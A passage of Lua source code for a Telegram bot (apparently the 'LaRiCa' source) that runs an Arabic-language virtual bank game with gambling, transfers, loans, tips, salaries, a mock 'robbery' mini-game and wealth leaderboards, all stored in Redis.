return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iiooo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تلعب لعبة الحظ الآن\n• تعال بعد ( 1 دقيقة )","md",true)
end
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
if tonumber(ballancee) < tonumber(coniss) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end

local daddd = {"1", "2",}
local haddd = daddd[math.random(#daddd)]
if haddd == "1" then
local ballanceek = ballancee + coniss
local convert_mony = string.format("%.0f",ballancee)
local convert_mony1 = string.format("%.0f",ballanceek)
Redis:set("boob"..msg.sender.user_id , math.floor(ballanceek))
Redis:setex("iiooo" .. msg.sender.user_id,900, true)
LuaTele.sendText(msg.chat_id,msg.id, "• مبروك لقد فزت بالحظ\n• فلوسك قبل • ( "..convert_mony.." دولار 💰 )\n• فلوسك الآن • ( "..convert_mony1.." دولار 💰 ) .","md",true)
else
local ballanceekk = ballancee - coniss
local convert_mony = string.format("%.0f",ballancee)
local convert_mony1 = string.format("%.0f",ballanceekk)
Redis:set("boob"..msg.sender.user_id , math.floor(ballanceekk))
Redis:setex("iiooo" .. msg.sender.user_id,900, true)
LuaTele.sendText(msg.chat_id,msg.id, "• للاسف خسرت بالحظ 👁️\n• فلوسك قبل • ( "..convert_mony.." دولار 💰 )\n• فلوسك الآن • ( "..convert_mony1.." دولار 💰 ) .","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'تحويل' then
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`تحويل` المبلغ","md",true)
end

if text and text:match('^تحويل (.*)$') then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` لكي تستطيع التحويل","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local UserName = text:match('^تحويل (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if not Redis:sismember("booob",msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ","md",true)
end
if tonumber(coniss) < 100 then
return LuaTele.sendText(msg.chat_id,msg.id, "• الحد الادنى المسموح به هو 100 دولار ","md",true)
end
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
if tonumber(ballancee) < 100 then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end

if tonumber(coniss) > tonumber(ballancee) then
return LuaTele.sendText(msg.chat_id,msg.id, "عذرا فلوسك لا تكفي","md",true)
end

Redis:set("transn"..msg.sender.user_id,coniss)
Redis:setex("trans" .. msg.chat_id .. ":" .. msg.sender.user_id,60, true)
LuaTele.sendText(msg.chat_id,msg.id,[[
• ارسل الآن رقم الحساب البنكي الذي تريد التحويل له

• معاك دقيقة وحدة والغي طلب التحويل .

]],"md",true)  
return false
end
if Redis:get("trans" .. msg.chat_id .. ":" .. msg.sender.user_id) then
cccc = Redis:get("boobb"..msg.sender.user_id)
uuuu = Redis:get("bbobb"..msg.sender.user_id)
if text ~= text:match('^(%d+)$') then
Redis:del("trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del("transn" .. msg.sender.user_id)
return LuaTele.sendText(msg.chat_id,msg.id,"• ارسل رقم حساب بنكي ","md",true)
end
if text == cccc then
Redis:del("trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del("transn" .. msg.sender.user_id)
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يمكنك تحول لنفسك ","md",true)
end
if Redis:get("boballcc"..text) then
local UserNamey = Redis:get("transn"..msg.sender.user_id)
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
news = " لا يوجد "
end
local fsvhhh = Redis:get("boballid"..text)
local bann = LuaTele.getUser(fsvhhh)
if bann.first_name then
newss = "["..bann.first_name.."](tg://user?id="..bann.id..")"
else
newss = " لا يوجد "
end
local fsvhh = Redis:get("boballban"..text)
UserNameyr = UserNamey / 10
UserNameyy = UserNamey - UserNameyr
local convert_mony = string.format("%.0f",UserNameyy)
ballancee = Redis:get("boob"..msg.sender.user_id) or 0
deccde = ballancee - UserNamey
Redis:set("boob"..msg.sender.user_id , math.floor(deccde))
-----------
decdecb = Redis:get("boob"..fsvhhh) or 0
deccde2 = decdecb + UserNameyy
Redis:set("boob"..fsvhhh , math.floor(deccde2))

LuaTele.sendText(msg.chat_id,msg.id, "حوالة صادرة من بنك لاريكا\n\nالمرسل : "..news.."\nرقم الحساب : `"..cccc.."`\nنوع البطاقة : "..uuuu.."\nالمستلم : "..newss.."\nرقم الحساب : `"..text.."`\nنوع البطاقة : "..fsvhh.."\nخصمت 10% رسوم تحويل\nالمبلغ : "..convert_mony.." دولار 💰","md",true)
LuaTele.sendText(fsvhhh,0, "حوالة واردة من بنك لاريكا\n\nالمرسل : "..news.."\nرقم الحساب : `"..cccc.."`\nنوع البطاقة : "..uuuu.."\nالمبلغ : "..convert_mony.." دولار 💰","md",true)
Redis:del("trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del("transn" .. msg.sender.user_id)
else
LuaTele.sendText(msg.chat_id,msg.id, "• لا يوجده حساب بنكي كذا","md",true)
Redis:del("trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del("transn" .. msg.sender.user_id)
end
end


if text == "ترتيبي" then
if Redis:sismember("booob",msg.sender.user_id) then
local bank_users = Redis:smembers("booob")
my_num_in_bank = {}
for k,v in pairs(bank_users) do
local mony = Redis:get("boob"..v)
table.insert(my_num_in_bank, {math.floor(tonumber(mony)) , v})
end
table.sort(my_num_in_bank, function(a, b) return a[1] > b[1] end)
for k,v in pairs(my_num_in_bank) do
if tonumber(v[2]) == tonumber(msg.sender.user_id) then
local mony = v[1]
return LuaTele.sendText(msg.chat_id,msg.id,"• ترتيبك ( "..k.." )","md",true)
end
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == "توب فلوس" or text == "توب الفلوس" then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local bank_users = Redis:smembers("booob")
if #bank_users == 0 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يوجد حسابات في البنك","md",true)
end
top_mony = "توب اغنى 25 شخص في بنك لاريكا :\nــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
mony_list = {}
for k,v in pairs(bank_users) do
local mony = Redis:get("boob"..v)
table.insert(mony_list, {tonumber(mony) , v})
end
table.sort(mony_list, function(a, b) return a[1] > b[1] end)
num = 1
emoji ={ 
"🥇" ,
"🥈",
"🥉",
"4 ➙",
"5 ➙",
"6 ➙",
"7 ➙",
"8 ➙",
"9 ➙",
"10 ➙",
"11 ➙",
"12 ➙",
"13 ➙",
"14 ➙",
"15 ➙",
"16 ➙",
"17 ➙",
"18 ➙",
"19 ➙",
"20 ➙",
"21 ➙",
"22 ➙",
"23 ➙",
"24 ➙",
"25 ➙"
}
for k,v in pairs(mony_list) do
if num <= 25 then
local user_name = LuaTele.getUser(v[2]).first_name or Redis:get(v[2].."first_name:") or "لا يوجد اسم"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emo = emoji[k]
num = num + 1
top_mony = top_mony..emo.." "..convert_mony.." || "..user_name.."\n"
end
end
top_monyy = top_mony.."\nــــــــــــــــــــــــــــــــــــــــــــــــــ\n• اي اسم مخالف او غش باللعب راح يتصفر وينحظر اللاعب"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ source 𝘓𝘢𝘙𝘐𝘤𝘈 ›', url="t.me/LaRiCaTeam"},
},
}
}
return LuaTele.sendText(msg.chat_id,msg.id,top_monyy,"html",false, false, false, false, reply_markup)
end

if text == "توب الحراميه" or text == "توب الحرامية" or text == "توب حراميه" or text == "توب التسليب" or text == "توب تسليب" then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local ty_users = Redis:smembers("rrfffid")
if #ty_users == 0 then
return LuaTele.sendText(msg.chat_id,msg.id,"• لا يوجد احد","md",true)
end
ty_anubis = "توب 20 شخص يسلبون فلوس في بنك لاريكا :\nــــــــــــــــــــــــــــــــــــــــــــــــــ\n"
ty_list = {}
for k,v in pairs(ty_users) do
local mony = Redis:get("rrfff"..v)
table.insert(ty_list, {tonumber(mony) , v})
end
table.sort(ty_list, function(a, b) return a[1] > b[1] end)
num_ty = 1
emojii ={ 
"🥇" ,
"🥈",
"🥉",
"4 ➙",
"5 ➙",
"6 ➙",
"7 ➙",
"8 ➙",
"9 ➙",
"10 ➙",
"11 ➙",
"12 ➙",
"13 ➙",
"14 ➙",
"15 ➙",
"16 ➙",
"17 ➙",
"18 ➙",
"19 ➙",
"20)"
}
for k,v in pairs(ty_list) do
if num_ty <= 20 then
local user_name = LuaTele.getUser(v[2]).first_name or Redis:get(v[2].."first_name:") or "لا يوجد اسم"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emoo = emojii[k]
num_ty = num_ty + 1
ty_anubis = ty_anubis..emoo.." "..convert_mony.." || "..user_name.."\n"
end
end
ty_anubiss = ty_anubis.."\nــــــــــــــــــــــــــــــــــــــــــــــــــ\n• اي اسم مخالف او غش باللعب راح يتصفر وينحظر اللاعب"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ source 𝘓𝘢𝘙𝘐𝘤𝘈 ›', url="t.me/LaRiCaTeam"},
},
}
}
return LuaTele.sendText(msg.chat_id,msg.id,ty_anubiss,"md",false, false, false, false, reply_markup)
end

if text == 'تسديد قرضه' and tonumber(msg.reply_to_message_id) ~= 0 then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• لا يمتلك حساب بالبنك*","md",true)  
return false
end
if Redis:sismember("booob",Remsg.sender.user_id) then
if Redis:get("kreed"..msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• سدد قرضك اول شي بعدين اعمل راعي النشامى ","md",true)
end
if not Redis:get("kreed"..Remsg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• ماعليه قرض","md",true)
else
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..Remsg.sender.user_id))
if tonumber(ballanceed) < tonumber(krses) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end
nshme = ballanceed - krses
Redis:set("boob"..msg.sender.user_id,math.floor(nshme))
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
Redis:del("kreed"..Remsg.sender.user_id)
Redis:del("kreednum"..Remsg.sender.user_id)
local convert_mony = string.format("%.0f",ballanceed)
LuaTele.sendText(msg.chat_id,msg.id, "• اشعار تسديد قرض عن "..news.."\n\nالقرض : "..krses.." دولار 💰\nتم اقتطاع المبلغ من فلوسك\nفلوسك الآن : "..convert_mony.." دولار 💰 ","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديه حساب بنكي ","md",true)
end
end

if text == 'تسديد قرض' or text == 'تسديد القرض' or text == 'تسديد قرضي' and tonumber(msg.reply_to_message_id) == 0 then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
if not Redis:get("kreed"..msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• ماعليك قرض ","md",true)
end
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if tonumber(ballanceed) < tonumber(krses) then
return LuaTele.sendText(msg.chat_id,msg.id, "*• عذرا فلوسك لا تكفي*","md",true)
end
tsded = ballanceed - krses
Redis:set("boob"..msg.sender.user_id,math.floor(tsded))
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
Redis:del("kreed"..msg.sender.user_id)
Redis:del("kreednum"..msg.sender.user_id)
local convert_mony = string.format("%.0f",ballanceed)
LuaTele.sendText(msg.chat_id,msg.id, "• اشعار تسديد قرض\n\nالقرض : "..krses.." دولار 💰\nتم اقتطاع المبلغ من فلوسك\nفلوسك الآن : "..convert_mony.." دولار 💰","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'القرض' or text == 'قرض' then
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) then
return LuaTele.sendText(msg.chat_id,msg.id, "• سحبت قرض قبل بقيمة "..krses.." دولار 💰","md",true)
end
if Redis:sismember("booob",msg.sender.user_id) then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
if tonumber(ballanceed) < 100000 then
kredd = tonumber(ballanceed) + 900000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,900000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 900000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 200000 then
kredd = tonumber(ballanceed) + 800000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,800000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 800000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 300000 then
kredd = tonumber(ballanceed) + 700000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,700000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 700000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 400000 then
kredd = tonumber(ballanceed) + 600000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,600000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 600000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 500000 then
kredd = tonumber(ballanceed) + 500000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,500000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 500000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 600000 then
kredd = tonumber(ballanceed) + 400000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,400000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 400000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 700000 then
kredd = tonumber(ballanceed) + 300000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,300000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 300000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 800000 then
kredd = tonumber(ballanceed) + 200000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,200000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 200000 دولار 💰","md",true)
elseif tonumber(ballanceed) < 900000 then
kredd = tonumber(ballanceed) + 100000
Redis:set("boob"..msg.sender.user_id,kredd)
Redis:set("kreednum"..msg.sender.user_id,100000)
Redis:set("kreed"..msg.sender.user_id,true)
LuaTele.sendText(msg.chat_id,msg.id, "• تم وهو قرض بقيمة 100000 دولار 💰","md",true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• فلوسك فوق المليون مايطلعلك قرض","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'بخشيش' or text == 'بقشيش' then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
if Redis:ttl("iioo" .. msg.sender.user_id) >=1 then
local hours = Redis:ttl("iioo" .. msg.sender.user_id) / 60
return LuaTele.sendText(msg.chat_id,msg.id,"• اخذت منذ قليل بخشيش استنى "..math.floor(hours).." دقيقة","md",true)
end

local jjjo = math.random(200,1000);
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
bakigcj = ballanceed + jjjo
Redis:set("boob"..msg.sender.user_id , bakigcj)
LuaTele.sendText(msg.chat_id,msg.id,"• دلعتك وعطيتك "..jjjo.." دولار 💰","md",true)
Redis:setex("iioo" .. msg.sender.user_id,600, true)
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'تسليب' and tonumber(msg.reply_to_message_id) == 0 then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
LuaTele.sendText(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`تسليب` بالرد","md",true)
end

if text == 'تسليب' or text == 'يسلبون' or text == 'تسليبه' and tonumber(msg.reply_to_message_id) ~= 0 then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• لا يمتلك حساب بالبنك*","md",true)  
return false
end
if Remsg.sender.user_id == msg.sender.user_id then
LuaTele.sendText(msg.chat_id,msg.id,"\n*• بدك تتسليب نفسك 🤡*","md",true)  
return false
end
if Redis:ttl("polic" .. msg.sender.user_id) >= 280 then
return LuaTele.sendText(msg.chat_id,msg.id,"• انتا بالسجن 🏤 استنى ( 5 دقائق )","md",true)
elseif Redis:ttl("polic" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• انتا بالسجن 🏤 استنى ( 4 دقائق )","md",true)
elseif Redis:ttl("polic" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• انتا بالسجن 🏤 استنى ( 3 دقائق )","md",true)
elseif Redis:ttl("polic" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• انتا بالسجن 🏤 استنى ( 2 دقيقة )","md",true)
elseif Redis:ttl("polic" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• انتا بالسجن 🏤 استنى ( 1 دقيقة )","md",true)
end
if Redis:ttl("hrame" .. Remsg.sender.user_id) >= 880 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 15 دقيقة )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 820 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 14 دقيقة )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 760 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 13 دقيقة )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 700 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 12 دقيقة )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 640 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 11 دقيقة )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("hrame" .. Remsg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• ذا المسكين مزروف قبل شوي\n• يمديك تتسليبه بعد ( 1 دقيقة )","md",true)
end
if Redis:sismember("booob",Remsg.sender.user_id) then
ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
if tonumber(ballanceed) < 199 then
return LuaTele.sendText(msg.chat_id,msg.id, "• لا يمكنك تتسليبه فلوسه اقل من 200 دولار 💰","md",true)
end
local hrame = math.floor(math.random() * 200) + 1;
local hramee = math.floor(math.random() * 5) + 1;
if hramee == 1 or hramee == 2 or hramee == 3 or hramee == 4 then
local ballanceed = Redis:get("boob"..Remsg.sender.user_id) or 0
local ballancope = Redis:get("boob"..msg.sender.user_id) or 0
zrfne = ballanceed - hrame
zrfnee = ballancope + hrame
Redis:set("boob"..msg.sender.user_id , math.floor(zrfnee))
Redis:set("boob"..Remsg.sender.user_id , math.floor(zrfne))
Redis:setex("hrame" .. Remsg.sender.user_id,900, true)
local zoropeo = Redis:get("rrfff"..msg.sender.user_id) or 0
zoroprod = zoropeo + hrame
Redis:set("rrfff"..msg.sender.user_id,zoroprod)
Redis:sadd("rrfffid",msg.sender.user_id)
LuaTele.sendText(msg.chat_id,msg.id, "• خذ يالحرامي تسليبته "..hrame.." دولار 💰","md",true)
else
Redis:setex("polic" .. msg.sender.user_id,300, true)
LuaTele.sendText(msg.chat_id,msg.id, "• مسكتك الشرطة وانتا تتسليب 🚔","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديه حساب بنكي ","md",true)
end
else
LuaTele.sendText(msg.chat_id,msg.id, "• ليس لديك حساب بنكي ارسل : ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'راتب' or text == 'راتبي' then
ballanceed = Redis:get("boob"..msg.sender.user_id) or 0
krses = tonumber(Redis:get("kreednum"..msg.sender.user_id))
if Redis:get("kreed"..msg.sender.user_id) and tonumber(ballanceed) > 5000000 then
return LuaTele.sendText(msg.chat_id,msg.id, "• عليك قرض بقيمة "..krses.." دولار 💰 \nقم بسداده بالامر `تسديد القرض` ","md",true)
end
local F_Name = LuaTele.getUser(msg.sender.user_id).first_name
Redis:set(msg.sender.user_id.."first_name:", F_Name)
if Redis:sismember("booob",msg.sender.user_id) then
if Redis:ttl("iiioo" .. msg.sender.user_id) >= 580 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 10 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 540 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 9 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 480 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 8 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 420 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 7 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 360 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 6 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 300 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 5 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 240 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 4 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 180 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 3 دقائق )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 120 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 2 دقيقة )","md",true)
elseif Redis:ttl("iiioo" .. msg.sender.user_id) >= 60 then
return LuaTele.sendText(msg.chat_id,msg.id,"• راتبك بينزل بعد ( 1 دقيقة )","md",true)
end

local Textinggt = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52",}
local Descriptioont = Textinggt[math.random(#Textinggt)]
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
neews = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
neews = " لا يوجد "
end
local ballancee = Redis:get("boob"..msg.sender.user_id) or 0
if Descriptioont == "1" then
local ratpep = ballancee + 3000
Redis:set("boob"..msg.sender.user_id , math.floor(ratpep))
